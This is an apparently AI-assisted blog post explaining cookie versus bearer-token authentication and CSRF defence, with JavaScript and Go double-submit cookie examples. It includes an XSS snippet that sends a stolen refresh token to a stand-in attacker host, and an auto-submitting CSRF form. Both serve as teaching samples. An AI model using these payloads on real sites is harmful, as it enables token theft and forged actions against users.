---
title: 'Web Security: Cookies, and CSRF'
date: '2025-07-31'
tags: web-security, authentication, csrf, web-development, security
ai-gen: true
---

Recently, I dove into authentication and CSRF (Cross-Site Request Forgery) protection while building a modern web app with both browser and mobile clients. Here's what I learned about keeping your applications secure.

## Bearer Tokens vs. Cookies for Authentication

### Bearer Tokens

- Sent in the `Authorization` header: `Authorization: Bearer <token>`
- Ideal for mobile, desktop apps, and SPAs
- Not sent automatically by browsers - must be set explicitly
- Immune to CSRF attacks (malicious sites can't set custom headers)

### Cookies

- Automatically sent by browsers with every request
- Can be secured with `HttpOnly` flag
- Vulnerable to CSRF attacks if not properly protected
- Browsers will send cookies even for malicious cross-site requests

## Understanding CSRF and Its Impact

**CSRF (Cross-Site Request Forgery)** occurs when a malicious website tricks a user's browser into making unwanted requests to your backend. If your application only checks for valid cookies, an attacker could perform actions on behalf of your users without their knowledge.

## When Is CSRF Protection Necessary?

- **Cookies for authentication?**

Use case: Storing refresh token in cookie is safest way in the web.

**Alternative - localStorage is prone to XSS**: Storing refresh tokens in localStorage creates a significant security vulnerability. If an attacker successfully injects malicious JavaScript (XSS), they can easily steal the token:

```javascript
// Malicious script injected via XSS
const stolenToken = localStorage.getItem('refreshToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

**Why cookies are safer**: Even with XSS, HttpOnly cookies cannot be accessed by JavaScript, making them immune to token theft.

- ✅ Required for all state-changing endpoints (POST, PUT, DELETE, etc.) e.g. `/refresh` and `/logout`

**CSRF Attack Example**: Consider a banking application where a user is logged in. An attacker creates a malicious website that automatically submits a form to the bank's logout endpoint:

```html
<!-- Malicious website form -->
<form action="https://bank.com/logout" method="POST" id="csrf-form">
  <input type="hidden" name="action" value="logout">
</form>
<script>
  // Automatically submit the form when page loads
  document.getElementById('csrf-form').submit();
</script>
```

If the user visits this malicious site while logged into their bank account, they could be logged out without their knowledge. With CSRF protection, the bank would require a valid CSRF token in the request headers, which only the legitimate bank website can provide.

- **Bearer tokens in headers?**
  - ❌ Not needed
  - Browsers can't set `Authorization` headers on cross-origin requests

## How CSRF Protection Works

The standard defense is the **double-submit cookie** pattern:

1. Server sets a CSRF token cookie (not `HttpOnly`)
2. Frontend JavaScript reads this token and sends it in a custom header (e.g., `X-CSRF-Token`)
3. Backend verifies the token in the header matches the cookie value

This works because while browsers automatically send cookies, only your legitimate frontend can read the CSRF token and include it in the request headers.

## Implementation Example

**Frontend (JavaScript):**

```javascript
// Get CSRF token from cookie
function getCSRFTokenFromCookie(): string | null {
  const match = document.cookie.match(/(?:^|; )csrf_token=([^;]*)/);
  return match ? decodeURIComponent(match[1]) : null;
}

// Get CSRF token from
async function getCSRFTokenSafe(): Promise<string> {
  const csrfToken = getCSRFTokenFromCookie();
  if (csrfToken && csrfToken.length > 0) {
    return csrfToken;
  }

  // Only try authenticated CSRF token endpoint
  await fetch('/csrf', {
    credentials: 'include',
  });

  const newCsrfToken = getCSRFTokenFromCookie();
  if (!newCsrfToken) {
    throw new Error('CSRF token not found');
  }

  return newCsrfToken;
}

// Read CSRF token from cookie and include in request
const csrfToken = await getCSRFTokenSafe()
fetch('/api/sensitive-action', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-CSRF-Token': csrfToken,
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ action: 'update' }),
});
```

**Backend (Go example):**

```go
// csrf endpoint
func (h *TokenHandler) HandleGetCSRFToken(w http.ResponseWriter, r *http.Request) {
	// validate refresh token
	validationResult := h.validateRefreshToken(r)

	// If token is revoked/invalid, clear cookies and return 401
	if !validationResult.IsValid {
		utils.RespondWithJSON(w, http.StatusUnauthorized, nil)
		return
	}

	csrfToken, err := utils.GenerateCSRFToken() // a secure random key of 32 bytes
	if err != nil {
		log.Printf("Failed to generate CSRF token: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	utils.SetCSRFCookie(w, csrfToken)
	utils.RespondWithJSON(w, http.StatusOK, nil)
}

// CSRF middleware to protect state changing endpoints like /refresh or /logout
func CSRFMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        csrfCookie, err := r.Cookie("csrf_token")
        if err != nil {
            http.Error(w, "CSRF token missing", http.StatusForbidden)
            return
        }

        csrfHeader := r.Header.Get("X-CSRF-Token")
        if csrfHeader == "" || csrfHeader != csrfCookie.Value {
            http.Error(w, "Invalid CSRF token", http.StatusForbidden)
            return
        }

        next.ServeHTTP(w, r)
    })
}
```

## Key Security Takeaways

1. **Bearer tokens** are ideal for APIs and client-side applications
2. **Cookies** work well for web but require CSRF protection
3. **CSRF tokens** must be implemented correctly to be effective
4. Always use **HTTPS** to protect tokens in transit
5. Keep your authentication logic simple and well-tested

## Final Thoughts

Security is not a feature you can bolt on at the end - it needs to be part of your application's foundation. By understanding these concepts and implementing them correctly, you'll be well on your way to building more secure web applications.

Remember: The best security is layered security. Combine these techniques with other security measures like rate limiting, input validation, and regular security audits for maximum protection.

_This article was generated with the assistance of Claude 4. Always review and adapt security practices to your specific use case and requirements._
